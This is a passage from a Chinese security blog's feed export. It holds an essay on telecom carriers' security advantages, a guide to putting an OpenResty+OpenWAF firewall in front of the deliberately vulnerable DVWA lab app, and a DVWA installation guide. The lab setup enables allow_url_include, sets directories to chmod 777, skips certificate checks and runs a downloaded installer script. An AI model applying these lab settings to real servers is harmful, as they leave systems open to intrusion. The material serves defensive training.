          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运营商在安全领域的优势分析</title>
      <link href="/posts/3b6a1140/"/>
      <url>/posts/3b6a1140/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230410/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A84.jpeg" alt="网络安全" title="网络安全"></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>近年来，中美贸易摩擦加剧，国际争端凸显，国家高度重视网络安全的建设，网络安全已上升及国家战略层面，网络空间作为“第五疆域”受到极大重视。个人与企业对于网络安全的需求不断增加，中国网络安全市场也随之发展。</p><h3 id="政策支持，网络安全需求不断增加"><a href="#政策支持，网络安全需求不断增加" class="headerlink" title="政策支持，网络安全需求不断增加"></a>政策支持，网络安全需求不断增加</h3><p>近年来，网络安全被提升到国家战略高度，正在加快推进网络安全技术自主创新，朝着建设网络强国目标不懈努力。2014年以来先后设立中国安全委员会、中央网络安全和信息化委员会，发布了《国家安全法》、《中华人民共和国网络安全法》、《国家网络空间安全战略》、《网络空间国际合作战略》、《中华人民共和国数据安全法》等多项鼓励行业发展的法规和政策。这些法规政策规范了网络信息安全行业，为网络安全行业发展营造了良好的环境。</p><h3 id="信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求"><a href="#信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求" class="headerlink" title="信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求"></a>信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求</h3><p>近年来，中国信息化水平不断攀升：云计算的进步带动计算能力和数据的集中；大数据的出现带来数据收集、处理、分析业态的革新；5G网络加速了网络数据处理速度；随着“云+5G”的共同催化，联网设备将呈现指数级增长，中国网络安全行业未来将布局更多的应用领域。<br>同时，以上科技进步也引发了新的网络安全问题，对网络安全行业提出新要求，数据的产生流通和应用更加普遍化和密集化，使网络安全的防范更加复杂，对网络安全提出更高的挑战。<br>2019年9月27日工信部公开征求对《关于促进网络安全产业发展的指导意见（征求意见稿）》的意见，征求意见稿中提出，到2025年，培育形成一批年营收超过20亿的网络安全企业，形成若干具有国际竞争力的网络安全骨干企业，网络安全产业规模超过2000亿。</p><p>在此背景下大型国有企业尤其是电信运营商纷纷布局网络安全。如中国移动收购启明星辰、中国电信组建专门的网络与信息安全研究院成立成立天翼安全科技有限公司、联通成立一家专注于网络安全服务的新公司计划将信息安全业务打造成创新业务发展的主要增长点。</p><h2 id="优势分析"><a href="#优势分析" class="headerlink" title="优势分析"></a>优势分析</h2><p>那么运营商在安全领域发展都会有哪些优势呢？</p><h3 id="一、网络优势"><a href="#一、网络优势" class="headerlink" title="一、网络优势"></a>一、网络优势</h3><p>电信运营商，作为国家网络基础设施的建设者和运营者，具备强大的网络优势。在工信部《关于促进网络安全产业发展的指导意见（征求意见稿）》明确提出鼓励基础电信企业和云服务提供商发挥网络资源优势，面向客户提供网络安全监测预警、攻击防护、应急保障等增值服务。</p><h3 id="二、数据优势"><a href="#二、数据优势" class="headerlink" title="二、数据优势"></a>二、数据优势</h3><p>运营商有大网的数据优势，如：DDOS异常流量监测数据、IDC/ISP数据、僵木蠕恶意程序数据、互联网暴露资产数据等，通过整合电信运营商大网数据能力，汇聚各类安全数据资源，结合大网威胁情报信息，能够更好的赋能安全产品。</p><h3 id="三、产品优势"><a href="#三、产品优势" class="headerlink" title="三、产品优势"></a>三、产品优势</h3><p>运营商自身自研建设了大量的安全基础能力。以电信为例，近年来积极打造了一系列硬核自主研发的安全产品如云堤抗DDoS、互联网测绘平台、安全态势感知平台、安全运营中心、安全资源池等保租手等等，安全产品均已通过运营商级的大网实战验证。生态开放，具备端到端的产品集成、产品研发和定制能力，提供一体化、全方位、一站式的综合解决方案。相对于传统的安全产商，传统安全设备产商的某些个别的产品可能有优势，但产品可能只适配自家的产品，对其他厂商比较封闭，端到端的产品集成和定制化能力相对较弱。</p><h3 id="四、运营优势"><a href="#四、运营优势" class="headerlink" title="四、运营优势"></a>四、运营优势</h3><p>成功的安全在于运营，运营商自身作为典型的关基行业企业，面对工信部、通管局、公安、网信办等多个监管部门的监管和考核，自身积累了丰富的安全运营经验和实战化的重保经验，并且将自身的安全运营经验、重保经验赋能至安全产品。可面向行业监管单位和关基等客户量身打造基于实战化、可视化、专业级的安全运营产品集。而传统安全产商，一般只提供标准产品，安全运营经验赋能产品相对不足。</p><h3 id="五、服务优势"><a href="#五、服务优势" class="headerlink" title="五、服务优势"></a>五、服务优势</h3><p>电信运营商具备强大的信息化和安全的一体两翼的能力，比传统安全公司更懂信息化和网络，建立了从信息系统和网络的规划与设计、再到实施建设、生产运行维护，涉及整个业务系统安全稳定运行的安全服务体系。</p><p>电信运营商具备覆盖全国的省-市-县的本地化专业的安全服务团队，专业安全服务团队能对客户形成一对一的贴身服务。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenResty+OpenWAF的WEB防护实战</title>
      <link href="/posts/dbe7a5ab/"/>
      <url>/posts/dbe7a5ab/</url>
      
        <content type="html"><![CDATA[<p>OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。本文介绍通过OpenResty+OpenWAF来搭建软WAF的应用，用来防护DVWA的靶机，然后我们通过攻击DVWA的靶机来看一下OpenWAF的防护效果。</p><h2 id="一、OpenResty-OpenWAF安装"><a href="#一、OpenResty-OpenWAF安装" class="headerlink" title="一、OpenResty+OpenWAF安装"></a>一、OpenResty+OpenWAF安装</h2><h3 id="1、安装依赖"><a href="#1、安装依赖" class="headerlink" title="1、安装依赖"></a>1、安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ wget GeoIP-devel git swig make perl perl-ExtUtils-Embed readline-devel zlib-devel -y</span><br></pre></td></tr></table></figure><p>安装libcidr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget http://www.over-yonder.net/~fullermd/projects/libcidr/libcidr-1.2.3.tar.xz</span><br><span class="line">tar -xvf libcidr-1.2.3.tar.xz</span><br><span class="line"><span class="built_in">cd</span> /opt/libcidr-1.2.3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>升级openssl版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget -c http://www.openssl.org/<span class="built_in">source</span>/openssl-1.1.1d.tar.gz --no-check-certificat</span><br><span class="line">tar -zxvf openssl-1.1.1d.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl-1.1.1d/</span><br><span class="line">./config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>下载pcre-jit<br>并解压pcre-jit，后面安装OpenResty的时候引入并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://udomain.dl.sourceforge.net/project/pcre/pcre/8.45/pcre-8.45.tar.gz --no-check-certificate</span><br><span class="line">tar -zxvf pcre-8.45.tar.gz</span><br></pre></td></tr></table></figure><h3 id="2、安装OpenWAF"><a href="#2、安装OpenWAF" class="headerlink" title="2、安装OpenWAF"></a>2、安装OpenWAF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/titansec/OpenWAF.git</span><br><span class="line">mv /opt/OpenWAF/lib/openresty/ngx_openwaf.conf /etc</span><br><span class="line">mv /opt/OpenWAF/lib/openresty/configure /opt/openresty-1.19.3.1</span><br><span class="line">cp -RP /opt/OpenWAF/lib/openresty/* /opt/openresty-1.19.9.1/bundle/</span><br><span class="line"><span class="built_in">cd</span> /opt/OpenWAF/</span><br><span class="line">make clean</span><br><span class="line">make install</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/lib/libcidr.so /opt/OpenWAF/lib/resty/libcidr.so</span><br></pre></td></tr></table></figure><h3 id="3、安装OpenResty"><a href="#3、安装OpenResty" class="headerlink" title="3、安装OpenResty"></a>3、安装OpenResty</h3><p>OpenResty官网的下载地址 <a href="https://openresty.org/en/download.html" target="_blank" rel="noopener">https://openresty.org/en/download.html</a><br>目前最新版本是1.21.4.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget https://openresty.org/download/openresty-1.21.4.1.tar.gz</span><br><span class="line">tar -zxvf openresty-1.21.4.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> /opt/openresty-1.21.4.1/</span><br><span class="line">./configure --with-pcre-jit --with-ipv6 --with-http_stub_status_module --with-http_ssl_module --with-http_realip_module --with-http_sub_module --with-http_geoip_module --with-openssl=/opt/openssl-1.1.1d --with-pcre=/opt/pcre-8.45</span><br><span class="line">gmake &amp;&amp; gmake install</span><br></pre></td></tr></table></figure><p>设置nginx开机自启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vim /lib/systemd/system/nginx.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx</span><br><span class="line">ExecReload=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx -s reload</span><br><span class="line">ExecStop=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx -s quit</span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置开机启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line"><span class="comment"># 查看服务当前状态</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="comment"># 启动nginx服务</span></span><br><span class="line">systemctl start nginx</span><br><span class="line"><span class="comment"># 停止nginx服务</span></span><br><span class="line">systemctl stop nginx</span><br><span class="line"><span class="comment"># 重启nginx服务</span></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p>当我们启动nginx的时候发现启动失败了，原因是因为原来安装了apache端口是80，nginx的端口也是80，端口冲突了。解决方案要不是改nginx端口，要不就是改apache的端口。这里将apache的端口改成8080。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost OpenWAF]<span class="comment"># systemctl start nginx</span></span><br><span class="line">Job <span class="keyword">for</span> nginx.service failed because the control process exited with error code. See <span class="string">"systemctl status nginx.service"</span> and <span class="string">"journalctl -xe"</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure><p>查看nginx启动状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost OpenWAF]<span class="comment"># systemctl status nginx</span></span><br><span class="line">● nginx.service - nginx</span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled)</span><br><span class="line">Active: failed (Result: <span class="built_in">exit</span>-code) since Tue 2023-04-04 04:00:44 PDT; 19s ago</span><br><span class="line">Process: 42096 ExecStart=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx (code=exited, status=1/FAILURE)</span><br><span class="line">Apr 04 04:00:42 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:42 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:43 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:43 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:44 localhost.localdomain nginx[42096]: nginx: [emerg] <span class="built_in">bind</span>() to 0.0.0.0:80 failed (98: Address already <span class="keyword">in</span> use)</span><br><span class="line">Apr 04 04:00:44 localhost.localdomain nginx[42096]: nginx: [emerg] still could not <span class="built_in">bind</span>()</span><br></pre></td></tr></table></figure><p>修改apache的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line">Listen 8080</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/1-apache%E7%AB%AF%E5%8F%A3.png" alt="修改apache端口的效果"></p><p>将apache的端口改成8080后，再次启动nginx就可以看到OpenResty成功启动了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/2-%E6%88%90%E5%8A%9F%E5%90%AF%E5%8A%A8OpenResty.png" alt="OpenResty成功启动了"></p><h2 id="二、配置OpenWAF的web防护"><a href="#二、配置OpenWAF的web防护" class="headerlink" title="二、配置OpenWAF的web防护"></a>二、配置OpenWAF的web防护</h2><p>这边DVWA靶机的地址是<a href="http://192.168.1.24:8080/DVWA/" target="_blank" rel="noopener">http://192.168.1.24:8080/DVWA/</a>  DVWA靶机的安装见另一篇博文《<a href="https://blog.csdn.net/fullbug/article/details/129879670" target="_blank" rel="noopener">CentOS7+LAMP+DVWA靶机搭建</a>》<a href="https://blog.csdn.net/fullbug/article/details/129879670" target="_blank" rel="noopener">https://blog.csdn.net/fullbug/article/details/129879670</a><br>我们需要配置OpenResty+OpenWAF来对192.168.1.24:8080进行WEB防护<br>参考《<a href="https://github.com/titansec/OpenWAF/blob/master/doc/%E8%BD%BB%E6%9D%BE%E7%8E%A9%E8%BD%ACOpenWAF%E4%B9%8B%E5%85%A5%E9%97%A8%E7%AF%87.md" target="_blank" rel="noopener">轻松玩转OpenWAF之入门篇</a>》及 《<a href="https://github.com/titansec/OpenWAF/blob/master/doc/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6OpenWAF%E4%B9%8Bnginx%E9%85%8D%E7%BD%AE.md" target="_blank" rel="noopener">深入研究OpenWAF之nginx配置</a>》</p><h3 id="1、nginx配置修改"><a href="#1、nginx配置修改" class="headerlink" title="1、nginx配置修改"></a>1、nginx配置修改</h3><p>在 nginx 的 http 级别添加如下两行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include /opt/OpenWAF/conf/twaf_main.conf;</span><br><span class="line">include /opt/OpenWAF/conf/twaf_api.conf;</span><br></pre></td></tr></table></figure><p>要防护的 server 或 location 级别添加如下一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include /opt/OpenWAF/conf/twaf_server.conf;</span><br></pre></td></tr></table></figure><p>OpenResty的nginx的配置文件在 /usr/local/openresty/nginx/conf/nginx.conf</p><p>具体配置参考下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/3-OpenResty%E7%9A%84nginx%E9%85%8D%E7%BD%AE.png" alt="nginx.conf相关配置"></p><h3 id="2、OpenWAF接入规则修改"><a href="#2、OpenWAF接入规则修改" class="headerlink" title="2、OpenWAF接入规则修改"></a>2、OpenWAF接入规则修改</h3><p>修改/opt/OpenWAF/conf/twaf_access_rule.json文件<br>具体配置参考下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/4-OpenWAF%E7%9A%84twaf_access_rule.json%E7%9A%84%E9%85%8D%E7%BD%AE.png" alt="twaf_access_rule.json文件的配置"></p><h3 id="3、测试验证"><a href="#3、测试验证" class="headerlink" title="3、测试验证"></a>3、测试验证</h3><p>这时候我们访问<a href="http://192.168.1.24/DVWA/" target="_blank" rel="noopener">http://192.168.1.24/DVWA/</a>  ，注意是没有带8080端口的，因为是通过OpenResty+OpenWAF来反向代理了127.0.0.1的8080端口，访问<a href="http://192.168.1.24/DVWA/" target="_blank" rel="noopener">http://192.168.1.24/DVWA/</a>  是经过了OpenWAF防护的。<br>这时候我们开始通过SQL注入对DVWA的靶机进行SQL注入的攻击。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/5-SQL%E6%B3%A8%E5%85%A5.png" alt="SQL注意"></p><p>防护效果：<br>可以看到OpenWAF提示标识为攻击并记录，提示是有次SQL注入的攻击，并进行了防护。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/5-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="SQL注入防护效果"></p><p>接下来我们进行一次XSS的攻击<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/6-XSS%E6%94%BB%E5%87%BB.png" alt="在这里插入图片描述"></p><p>同样OpenWAF给出了XSS的攻击提示，并进行了防护。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230407/6-XSS%E9%98%B2%E6%8A%A4%E6%95%88%E6%9E%9C.png" alt="XSS的防护效果"></p><p>至此，本文介绍了OpenResty+OpenWAF的安装，并通过配置对DVWA的靶机进行了WEB防护，通过SQL注入及XSS的攻击，验证了OpenWAF的效果。OpenResty+OpenWAF是开源的软WAF解决方案，安装和配置相对简单，对于中小企业的web防护来说不失为一个低成本的解决方案。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7+LAMP+DVWA靶机搭建</title>
      <link href="/posts/4405dad8/"/>
      <url>/posts/4405dad8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是DVWA"><a href="#一、什么是DVWA" class="headerlink" title="一、什么是DVWA"></a>一、什么是DVWA</h2><p>Damn Vulnerable Web Application (DVWA)(译注：可以直译为：”该死的”不安全Web应用程序)，是一个编码差的、易受攻击的 PHP/MySQL Web应用程序。 它的主要目的是帮助信息安全专业人员在合法的环境中，练习技能和测试工具，帮助 Web 开发人员更好地了解如何加强 Web 应用程序的安全性，并帮助学生和教师在可控的教学环境中了解和学习 Web 安全技术。<br>DVWA的中文介绍见 <a href="https://github.com/digininja/DVWA/blob/master/README.zh.md" target="_blank" rel="noopener">https://github.com/digininja/DVWA/blob/master/README.zh.md</a><br>下载地址：git clone <a href="https://github.com/digininja/DVWA.git" target="_blank" rel="noopener">https://github.com/digininja/DVWA.git</a></p><h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><h3 id="1、LAMP环境安装"><a href="#1、LAMP环境安装" class="headerlink" title="1、LAMP环境安装"></a>1、LAMP环境安装</h3><p>DVWA的安装依赖的软件包如下：</p><ul><li>apache2 </li><li>libapache2-mod-php </li><li>mariadb-server </li><li>mariadb-client php</li><li>php-mysqli php-gd</li></ul><p>就是依赖于LAMP环境，可以参考官方文档一个依赖包手工安装也可以通过下载lamp统一安装脚本一键安装。<br>安装 - LAMP一键安装包<br>运行 <code>wget -c http://soft.vpser.net/lnmp/lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lamp</code> 一路回车选择默认项，稍等片刻，即可完成安装<br>如果是手工安装：<code>yum install -y httpd php php-mysql php-gd mariadb-server mariadb</code></p><h2 id="三、安装DVWA"><a href="#三、安装DVWA" class="headerlink" title="三、安装DVWA"></a>三、安装DVWA</h2><h3 id="1、下载DVWA的软件包"><a href="#1、下载DVWA的软件包" class="headerlink" title="1、下载DVWA的软件包"></a>1、下载DVWA的软件包</h3><p>进入到默认的web发布目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/digininja/DVWA.git</span><br></pre></td></tr></table></figure><p>直接通过地址访问DVWA<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E8%AE%BF%E9%97%AEDVWA.png" alt="访问DVWA"><br>他会提示需要将config/config.inc.php.dist复制成config/config.inc.php并配置环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure><h3 id="2、配置数据库"><a href="#2、配置数据库" class="headerlink" title="2、配置数据库"></a>2、配置数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config.ini.php</span><br></pre></td></tr></table></figure><p>找到数据库的配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = array();</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_user'</span> ]     = <span class="string">'dvwa'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_password'</span> ] = <span class="string">'p@ssw0rd'</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'db_port'</span>] = <span class="string">'3306'</span>;</span><br></pre></td></tr></table></figure><p>根据config.inc.php的数据库配置信息配置数据库，注意不要用root来访问数据库。<br>先用客户端工具创建dvwa的数据库，再创建dvwa的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all on dvwa.* to <span class="string">'dvwa'</span>@<span class="string">'localhost'</span> identified by <span class="string">'p@ssw0rd'</span> with grant option;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>登录数据库查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dvwa -p</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/showdatabases.png" alt="show databases"></p><h3 id="3、修改php-ini的配置"><a href="#3、修改php-ini的配置" class="headerlink" title="3、修改php.ini的配置"></a>3、修改php.ini的配置</h3><p>再次访问DVWA<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/setupcheck.png" alt="在这里插入图片描述"></p><p>这里提示要修改php.ini的配置将 <code>allow_url_fopen=On</code> 和<code>allow_url_include=On</code>。</p><p>找到环境的php.ini我这里是在/etc/php.ini进行修改，不要修改/var/www/html/DVWA/php.ini中的配置了。<br>配置好后重启apache </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p>刷新浏览器，可以看到红色的Disabled告警消失了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E6%A3%80%E6%9F%A5check.png" alt="红色告警消失了"></p><p>reCAPTCHA key: Missing 这个告警是因为reCAPTCHA没有配置，这个需要去谷歌的网站申请公钥和私钥。可以不用管</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ReCAPTCHA settings</span></span><br><span class="line"><span class="comment">#   Used for the 'Insecure CAPTCHA' module</span></span><br><span class="line"><span class="comment">#   You'll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_public_key'</span> ]  = <span class="string">''</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">'recaptcha_private_key'</span> ] = <span class="string">''</span>;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 -R hackable</span><br><span class="line">chmod 777 -R config</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/%E4%BF%AE%E5%A4%8D%E7%BB%93%E6%9E%9C.png" alt="在这里插入图片描述"></p><h3 id="4、创建数据"><a href="#4、创建数据" class="headerlink" title="4、创建数据"></a>4、创建数据</h3><p>配置完后点击“Create/Reset Database”</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/createdatabase.png" alt="成功创建数据库"></p><h3 id="5、登录靶机"><a href="#5、登录靶机" class="headerlink" title="5、登录靶机"></a>5、登录靶机</h3><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/dvwa%E7%99%BB%E5%BD%95.png" alt="在这里插入图片描述"><br>DVWA的默认用户名和密码是admin /password<br>登录成功后就可以开始进行靶机的实验了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230331/DVWA%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png" alt="在这里插入图片描述"><br>后续我们将通过Open-WAF来搭建一个WAF来防护这个靶机感受一下软waf的防护情况。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
